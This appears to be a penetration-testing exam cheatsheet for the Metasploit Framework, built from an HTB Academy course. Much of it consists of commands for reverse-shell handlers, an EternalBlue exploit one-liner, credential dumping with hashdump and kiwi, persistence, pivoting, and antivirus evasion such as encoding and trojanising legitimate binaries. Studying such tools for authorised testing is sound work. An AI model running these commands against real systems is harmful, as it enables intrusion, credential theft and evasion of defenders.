# Using the Metasploit Framework — Exam Cheatsheet

**Distilled from HTB Academy "Using the Metasploit Framework" module.** Open this during the exam.

---

## The Methodology

```
1. db_status — DB connected → loot/notes auto-saved
2. workspace -a TARGET — keep engagements separated
3. db_nmap → hosts/services populated for "use … set RHOSTS"
4. search → use → info → set → check → run
5. sessions -i N → background with bg / Ctrl-Z+Y
6. Always SET PAYLOAD explicitly when default may be wrong
```

> **Forever rule:** `check` before `run` whenever the module supports it. Saves time, avoids alerting blue-team on the wrong service.

---

## Stage 0 — Setup

```bash
# Init/refresh DB
sudo systemctl start postgresql
sudo msfdb init
msfdb status

# Launch
msfconsole -q                       # quiet
msfconsole -q -r script.rc          # resource script
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; run -j"
```
> Start PostgreSQL first, then init the database. Launch with `-q` to skip the banner. Use `-x` to run inline commands at startup — handy for spinning up a listener in one shot.

In console:
```
db_status
workspace -a HTB_BoxName
workspace HTB_BoxName
hosts
services
vulns
notes
loot
```
> Run these after connecting to verify the database is working. `workspace -a` creates a new workspace; `workspace <name>` switches to it. `hosts`/`services` show what your scans found.

---

## Stage 1 — Module Types & Search

```
exploit/   weaponized RCE / file write
auxiliary/ scanners, brute, fuzz, DoS, gather, admin
post/      post-exploitation (sessions only)
payload/   shellcode (singles + stagers + stages)
encoder/   payload obfuscation
nop/       NOP sled
evasion/   AV bypass wrappers
```

```
search ms17-010
search type:exploit platform:windows cve:2017
search name:eternal
search path:smb type:auxiliary
search rank:excellent type:exploit smb
info N                              # use search index
use 0                               # by index
use exploit/windows/smb/ms17_010_psexec
back                                # leave module
reload                              # re-read module file
```
> Filter searches with keywords like `type:`, `platform:`, `rank:`. Use the index number from search results with `use 0` instead of typing full paths. `back` exits a module without quitting msfconsole.

> Skill the **rank** filter: `excellent`, `great`, `good`, `normal`, `average`, `low`, `manual`. Prefer `excellent`/`great`.

---

## Stage 2 — Module Use & Options

```
use <path>
show info             show options              show advanced
show targets          show payloads             show evasion
set RHOSTS 10.10.10.5
set RPORT 445
setg LHOST tun0       # global (sticks across modules)
setg LPORT 443
unset RHOSTS
unsetg LHOST
get RHOSTS

set PAYLOAD windows/x64/meterpreter/reverse_https
show payloads | head
check                  # safe pre-run probe
run                    # or: exploit
exploit -j -z          # background, don't interact
exploit -z             # don't auto-interact
```
> `setg` sets a value globally so it persists when you switch modules. `check` probes the target safely without running the exploit. `exploit -j` runs in the background as a job so you keep the console free.

### RHOSTS forms
```
set RHOSTS 10.10.10.5
set RHOSTS 10.10.10.0/24
set RHOSTS file:/tmp/targets.txt
set RHOSTS 10.10.10.5 10.10.10.6
```
> RHOSTS accepts a single IP, a CIDR range, a file, or a space-separated list. Use `file:` prefix to load targets from a text file, one host per line.

---

## Stage 3 — Payloads (singles, stagers, stages)

```
windows/x64/meterpreter/reverse_tcp        # staged
windows/x64/meterpreter/reverse_https      # staged HTTPS — best egress
windows/x64/meterpreter_reverse_tcp        # stageless (single _)
windows/x64/shell_reverse_tcp              # staged plain shell
linux/x64/meterpreter/reverse_tcp
linux/x64/shell_reverse_tcp
java/meterpreter/reverse_tcp               # cross-platform JVM
php/meterpreter/reverse_tcp
cmd/unix/reverse_python
generic/shell_reverse_tcp                  # no arch — use when unsure
```

Inline generation is `msfvenom` (see Shells & Payloads cheatsheet).

### Multi-handler
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 443
set ExitOnSession false
run -j
```
> The multi/handler listens for incoming connections from any payload you deploy. `ExitOnSession false` keeps the listener running after the first connection. `run -j` runs it as a background job.

---

## Stage 4 — Encoders & Evasion

```
show encoders
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set EncoderSpace 4096
```

CLI iterations (for AV evasion):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=X LPORT=443 \
  -e x64/xor_dynamic -i 10 -f exe -o pl.exe
```
> `-e` specifies the encoder, `-i 10` runs 10 encoding iterations. Modern AV still detects most SGN-encoded payloads, so encoding alone is not reliable evasion.

> Modern AV/EDR catches `shikata_ga_nai` instantly. For exam-time evasion, prefer **stageless + HTTPS + rename + drop via SMB share**, or compile custom shellcode loader.

`evasion/` modules:
```
use evasion/windows/windows_defender_exe
set FILENAME backup.exe
run
```
> Evasion modules wrap payloads in a way designed to bypass specific defenses. Set `FILENAME` to a believable name to avoid suspicion.

---

## Stage 5 — Sessions & Meterpreter

```
sessions -l            # list
sessions -i 1          # interact
sessions -k 1          # kill
sessions -K            # kill all
sessions -u 1          # upgrade shell to meterpreter
sessions -c "whoami"   # run cmd in all sessions
background             # send current session to bg (or Ctrl-Z, y)
```
> `-i` interacts with a session by ID. `-u` tries to upgrade a plain shell to a Meterpreter session. `-c` runs a command across every active session at once.

### Meterpreter core
```
sysinfo                getuid                getpid              ps
shell                  cat /etc/passwd       upload f /tmp/f     download /etc/shadow .
search -f *.kdbx       cd / pwd / ls         clearev             idletime
hashdump               kiwi → creds_all      load kiwi           load powershell
execute -f cmd.exe -i -H -c                  migrate <PID>
portfwd add -l 8080 -p 80 -r 127.0.0.1
portfwd list
run post/multi/recon/local_exploit_suggester
run post/windows/gather/checkvm
run post/windows/manage/enable_rdp
```

### Routing / pivoting
```
# After session on dual-homed box
run autoroute -s 172.16.119.0/24
# OR
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.119.0
run

# SOCKS proxy for proxychains
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
# /etc/proxychains.conf:  socks5 127.0.0.1 1080
proxychains nxc smb 172.16.119.0/24 -u U -p P
```
> `autoroute` tells MSF to route traffic to the internal subnet through the compromised host. The SOCKS proxy lets external tools like `nxc` reach the internal network via `proxychains`.

### Privilege escalation modules
```
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/windows/local/cve_2022_26904_superprofile
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
use post/multi/escalate/cups_root_file_read
```

### Hashdump / persistence
```
hashdump                                              # local SAM
load kiwi; lsa_dump_sam; lsa_dump_secrets; creds_all  # Mimikatz inside meterpreter
run post/windows/gather/credentials/credential_collector
run persistence -X -i 60 -p 4444 -r 10.10.14.X       # legacy, very loud
use exploit/windows/local/persistence_service
```
> `hashdump` dumps the SAM database (requires SYSTEM). `load kiwi` loads the Mimikatz-equivalent extension; `creds_all` dumps everything at once. Persistence modules write a service or registry key to survive reboots.

### File ops shortcuts
```
upload  /local /remote
download /remote /local
edit /etc/passwd
rm /tmp/x
mkdir /tmp/y
```

---

## Stage 6 — Database & Discovery

```
db_nmap -sCV -p- 10.10.10.0/24                 # populate hosts/services
hosts -R                                       # set RHOSTS to all hosts
services -p 445 -R                             # set RHOSTS to hosts w/ 445
services -S http
vulns
loot
notes
creds                                          # all collected creds
creds add user:U password:P
db_export -f xml /tmp/eng.xml
db_import /tmp/eng.xml
```
> `db_nmap` runs nmap and stores results automatically. `-R` on `hosts` or `services` populates RHOSTS from the query results. Always export with `db_export` before closing so you don't lose your work.

---

## Stage 7 — Plugins

```
load nessus            # then: nessus_connect, nessus_scan_*
load openvas
load sounds            # success bell
load alias
load aggregator
load wmap              # web app scanner
load lab               # vmware/VBox lab control
load auto_add_route
load pcap_log
```

---

## Stage 8 — Resource Scripts (RC) & Automation

```bash
# /tmp/start.rc
workspace -a HTB
db_nmap -sCV -p- 10.10.10.5
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 443
set ExitOnSession false
run -j

msfconsole -q -r /tmp/start.rc
```
> Resource scripts automate setup. Write your workflow to a `.rc` file and launch with `-r`. The file runs line by line at startup — great for repetitive engagement setup.

Inside meterpreter you can also:
```
run -h
run multi_console_command -rc /tmp/post.rc
run autorunscript /tmp/post.rc
```

---

## Stage 9 — MSFVenom Quick (cross-ref to Shells cheatsheet)

```bash
# Useful flags
-l payloads | grep windows
-l formats
-l encoders
--list-options -p PAY                 # show LHOST/LPORT/etc.
-f exe|elf|war|aspx|jsp|raw|c|python|powershell|hta-psh
-b '\x00\x0a\x0d'                    # bad chars
-i N -e ENCODER                      # iterations
-x template.exe -k                   # inject into legit binary, keep functionality
--platform windows --arch x64
--smallest                           # try every encoder for smallest output
--out / -o file
```
> `-f` sets the output format to match the target (`.aspx` for IIS, `.elf` for Linux, `.exe` for Windows). `-b` removes bad characters that would break the exploit. `-x -k` injects into a real binary and keeps it functional.

---

## Stage 10 — Killer One-Liners

```bash
# Quick handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set ExitOnSession false; run -j"

# Run an exploit then exit
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOSTS 10.10.10.40; set LHOST tun0; set LPORT 4445; run; exit -y"

# DB-backed nmap of a CIDR
msfconsole -q -x "workspace -a sweep; db_nmap -sCV -p 22,80,445,3389 10.129.0.0/24; services; exit -y"
```
> Chain commands with `;` inside `-x "..."` for fully automated non-interactive runs. `exit -y` skips the confirmation prompt. Useful for scripting and automation.

---

## Stage 11 — Firewall / IDS Evasion (§14)

```
# AV/EDR-friendly handler
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
set HandlerSSLCert /tmp/legit.pem      # use real LE cert
set StagerVerifySSLCert true
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set ListenerBindAddress 0.0.0.0
set ListenerBindPort 443
set OverrideRequestHost true
set OverrideScheme https
```

| Tip | Why |
|-----|-----|
| Use `reverse_https` on **443** | egress almost always allowed |
| Rotate URI: `set LURI /api/v2/sync` | unique-per-engagement |
| Set real-looking `HttpUserAgent` | no `Mozilla/4.0 (compatible; MSIE 6.0)` default |
| Use stageless when AV strips stage | single payload, slower handshake but simpler |
| Sign your binary | passes naive AppLocker / WDAC unsigned-block |
| Drop via SMB or WebDAV | bypasses some HTTP egress filters |

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| `Exploit failed: A target has not been selected` | `show targets`; `set TARGET N` |
| `Exploit completed, but no session was created` | LHOST/LPORT mismatch; payload arch wrong; AV killed; egress blocked → try reverse_https/443 |
| `RHOSTS file: not exists` | check path; `cat targets.txt` first |
| `db_status [*] postgresql selected, no connection` | `sudo systemctl start postgresql && msfdb init` |
| `check` says "Cannot reliably check" | run anyway with `set ForceExploit true` (rare) |
| Meterpreter hangs on download | `migrate` to a 64-bit stable process (`explorer.exe`/`svchost.exe`) |
| `kiwi` not loading | run `getsystem` first; meterpreter must be x64 if target is x64 |
| `getsystem` fails (UAC/ELAM) | use `bypassuac_*`, token impersonation, or reuse creds via PtH |
| Sessions die on disconnect | `set ExitOnSession false` and use `run -j` |
| Slow handler stagers | use stageless (`_` payloads) or smaller `--encoder` |
| `Invalid encoder for badchars` | drop encoder, use `-x template.exe -k`, or msfvenom shellcode + custom loader |

---

## Quick Cheats

| Want | Command |
|------|---------|
| List exploits for SMB | `search type:exploit platform:windows smb` |
| All Apache mods | `search apache type:exploit` |
| Show my session | `sessions -l` |
| Drop to shell from meterpreter | `shell` (`exit` returns) |
| Run cmd in all sessions | `sessions -c "ipconfig"` |
| Migrate process | `migrate -N explorer.exe` |
| Tunnel SOCKS | `auxiliary/server/socks_proxy` |
| Get suggested local exploits | `run post/multi/recon/local_exploit_suggester` |
| Save loot offline | `loot` then `cp ~/.msf4/loot/* /tmp/` |
| Resume work | `workspace HTB_BoxName` then `hosts; services; loot; creds` |

---

## References

- [02-Introduction_to_Metasploit.md](02-Introduction_to_Metasploit.md), [03-Introduction_to_MSFconsole.md](03-Introduction_to_MSFconsole.md)
- [04-Modules.md](04-Modules.md), [05-Targets.md](05-Targets.md), [06-Payloads.md](06-Payloads.md), [07-Encoders.md](07-Encoders.md)
- [08-Databases.md](08-Databases.md), [09-Plugins.md](09-Plugins.md)
- [10-Sessions.md](10-Sessions.md), [11-Meterpreter.md](11-Meterpreter.md), [12-Writing_and_Importing_Modules.md](12-Writing_and_Importing_Modules.md)
- [13-Introduction_to_MSFVenom.md](13-Introduction_to_MSFVenom.md), [14-Firewall_and_IDS_IPS_Evasion.md](14-Firewall_and_IDS_IPS_Evasion.md)
